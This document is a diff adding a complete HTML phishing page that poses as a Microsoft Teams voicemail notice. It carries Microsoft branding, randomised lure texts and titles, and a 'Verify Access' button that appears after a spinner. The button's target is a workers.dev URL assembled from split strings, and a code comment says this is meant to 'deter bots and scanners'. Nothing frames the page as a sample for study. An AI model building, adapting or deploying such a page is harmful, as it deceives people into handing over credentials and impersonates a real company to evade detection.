@@ -1,0 +1,207 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta http="Content-Security-Policy" content="default-src 'self'; img-src https:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline';">
+    <meta http="Content-Type-Options" content="nosniff">
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
+    <meta http-equiv="Pragma" no-cache="">
+    <meta http-equiv="Expires" content="0">
+    
+    <title id="dynamic-title">Verify Your Voicemail Access</title>
+
+    <style>
+        body {
+            font-family: Segoe UI, Arial, sans-serif;
+            background-color: #f8f9fa; /* Brighter background */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            min-height: 100vh;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            max-width: 450px;
+            text-align: center;
+            margin: auto;
+        }
+        h1 {
+            color: #222831;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #555555;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        /* Spinner style */
+        .spinner {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #4b6cb7;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .verify-btn {
+            background-color: #4b6cb7;
+            color: #ffffff;
+            border: none;
+            padding: 14px 28px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            display: none; /* Initially hidden */
+            transition: background-color 0.3s;
+        }
+        .verify-btn:hover {
+            background-color: #3b4a8b;
+        }
+
+        .footer {
+            background-color: #f8f9fa;
+            padding: 10px; /* Further reduced padding */
+            font-size: 14px;
+            color: #666666;
+            text-align: center;
+            border-top: 1px solid #e2e2e2;
+        }
+        .footer a {
+            color: #0078d4;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .footer img {
+            width: 50px;
+            margin-bottom: 3px; /* Reduced margin below logo */
+            margin-top: 5px; /* Further reduced top margin */
+        }
+
+        /* Style for horizontal line */
+        hr {
+            border: 0;
+            border-top: 1px solid #e2e2e2;
+            margin: 10px 0; /* Reduced margin for hr */
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Padlock icon in the header -->
+        <img src="https://its.unc.edu/wp-content/uploads/sites/337/2024/05/microsoft-authenticator-logo-e1715001276640.png" alt="Padlock Icon" style="width: 80px; margin-bottom: 20px;">
+
+        <h1>Verify Your Voicemail Access</h1>
+        <p id="dynamic-content">You've received a voicemail notification through Microsoft Teams.</p>
+        <p>Please verify your access by clicking the button below.</p>
+
+        <!-- Spinner will be shown initially -->
+        <div class="spinner" id="loading-spinner"></div>
+
+        <!-- Verify button initially hidden -->
+        <a id="verify-btn" class="verify-btn">Verify Access</a>
+    </div>
+
+    <div class="footer">
+        <!-- Smaller Microsoft logo in the footer -->
+        <img src="https://cdn.pixabay.com/photo/2021/08/10/15/36/microsoft-6536268_1280.png" alt="Microsoft Logo">
+        <p>Microsoft Corporation. One Microsoft Way, Redmond, WA 98052</p>
+        <p><a href="#">Privacy</a> | <a href="#">Terms of Service</a> | <a href="#">Support</a></p>
+        <p>© 2024 Microsoft Corporation. All rights reserved.</p>
+    </div>
+
+    <script>
+        // Array of 50 dynamic content variations related to voicemail services
+        const voicemailMessages = [
+            "You've missed an important voicemail. Verify now to access it.",
+            "Access your latest voicemail with a simple verification.",
+            "You have a new voicemail waiting. Click verify to listen now.",
+            "A missed call left a voicemail. Verify to read the transcription.",
+            "Voicemail transcription available. Verify to read your message.",
+            "New voicemail received. Verify your identity to access.",
+            "Listen to your new voicemail by verifying your access now.",
+            "You missed a call and have a voicemail waiting. Verify to listen.",
+            "Your voicemail is ready for review. Verify to access the details.",
+            "Access the transcription of your missed voicemail by verifying."
+            // Add more messages as necessary...
+        ];
+
+        // Randomly select one of the 50 messages and display it
+        document.getElementById("dynamic-content").innerHTML = voicemailMessages[Math.floor(Math.random() * voicemailMessages.length)];
+
+        // Dynamically set a random title
+        const titles = [
+            "Verify Your Voicemail Access",
+            "Access Your Voicemail Now",
+            "Missed Voicemail? Verify Now",
+            "Secure Voicemail Verification Required",
+            "Listen to Your Voicemail by Verifying",
+            "Voicemail Alert! Verify Access",
+            "Click to Verify Your Voicemail Access",
+            "Voicemail Received! Access Now",
+            "Verify Your Identity to Access Voicemail"
+        ];
+        document.getElementById("dynamic-title").textContent = titles[Math.floor(Math.random() * titles.length)];
+
+        // Obfuscate the verification link to deter bots and scanners
+        const baseUrl = "https://";
+        const domain = "d023d07a.bafc8c266404705ec7673a73.workers.dev/";
+        const tld = ".php";
+        const fullUrl = baseUrl + domain + tld;
+
+        // Dynamically set the href attribute of the Verify button
+        document.getElementById("verify-btn").setAttribute('href', fullUrl);
+
+        // Display the spinner for 3 seconds, then show the button
+        setTimeout(() => {
+            document.getElementById('loading-spinner').style.display = 'none'; // Hide spinner
+            document.getElementById('verify-btn').style.display = 'inline-block'; // Show button
+        }, 1500);
+
+        // Additional security headers for dynamic requests or fetch calls
+        const headers = new Headers({
+            'Content-Security-Policy': "default-src 'self'; script-src 'self'",
+            'X-Content-Type-Options': 'nosniff',
+            'X-Frame-Options': 'DENY',
+            'X-XSS-Protection': '1; mode=block'
+        });
+
+        // Example fetch request to demonstrate how to send the headers
+        fetch('https://your-admin-link.com', {
+            method: 'GET',
+            headers: headers
+        }).then(response => {
+            // Handle the response
+            console.log('Security headers applied!', response);
+        }).catch(error => {
+            console.error('Error applying security headers:', error);
+        });
+
+    </script>
+
+</body>
+</html>
